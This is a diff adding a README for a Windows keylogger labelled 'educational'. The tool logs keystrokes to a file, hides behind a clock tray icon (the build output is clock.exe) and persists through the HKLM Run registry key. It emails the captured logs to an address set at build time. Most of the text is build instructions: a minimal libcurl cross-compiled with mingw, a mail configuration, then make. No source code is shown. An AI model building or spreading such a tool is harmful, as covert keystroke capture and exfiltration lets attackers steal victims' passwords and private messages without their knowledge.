@@ -1,0 +1,79 @@
+ABOUT
+=====
+
+Educational winapi keylogger. Write log to 'C:\keylog.txt'. Display tray icon
+with current time popup and context menu. Can autoruns via Windows Register key
+('HKLM/Software/Microsoft/Windows/CurrentVersion/Run'), this controlled by
+context menu. Periodically send key logs to specified at build-time e-mail.
+
+BUILD
+=====
+
+Makefile for keylogger written in plan that 'make' running on Unix system, that
+have i686-mingw32 crosscompiler.
+
+Install libcurl to mingw directory. I use curl-7.33.0 with the next configure
+options:
+
+./configure CFLAGS='-Os'     \
+    --disable-ares           \
+    --disable-cookies        \
+    --disable-crypto-auth    \
+    --disable-curldebug      \
+    --disable-debug          \
+    --disable-dict           \
+    --disable-file           \
+    --disable-ftp            \
+    --disable-gopher         \
+    --disable-http           \
+    --disable-imap           \
+    --disable-ipv6           \
+    --disable-ldap           \
+    --disable-ldaps          \
+    --disable-libcurl-option \
+    --disable-manual         \
+    --disable-pop3           \
+    --disable-proxy          \
+    --disable-rtsp           \
+    --disable-telnet         \
+    --disable-tftp           \
+    --disable-verbose        \
+    --enable-shared=no       \
+    --enable-static=yes      \
+    --without-axtls          \
+    --without-ca-bundle      \
+    --without-ca-path        \
+    --without-cyassl         \
+    --without-gnutls         \
+    --without-libidn         \
+    --without-libmetalink    \
+    --without-librtmp        \
+    --without-libssh2        \
+    --without-nghttp2        \
+    --without-nss            \
+    --without-polarssl       \
+    --without-ssl            \
+    --without-winidn         \
+    --without-winssl         \
+    --without-zlib           \
+    --host=i686-mingw32      \
+    --prefix=${PATH_TO_KEYLOGGER}/mingw
+
+All actions sequence:
+
+----------------------------------------------
+cd ${PATH_TO_KEYLOGGER}
+mkdir mingw && cd mingw
+# Check http://curl.haxx.se/download.html
+download curl-7.33.0 && cd curl-7.33.0
+./configure ... --prefix=$(realpath ${PWD}/..)
+make && make install
+# Ok, curl installed.
+cd ../..
+cp sendmail_config.h{.example,}
+edit sendmail_config.h
+make
+# Ok, we get clock.exe file.
+----------------------------------------------
+
+// vim: set ft=asciidoc:
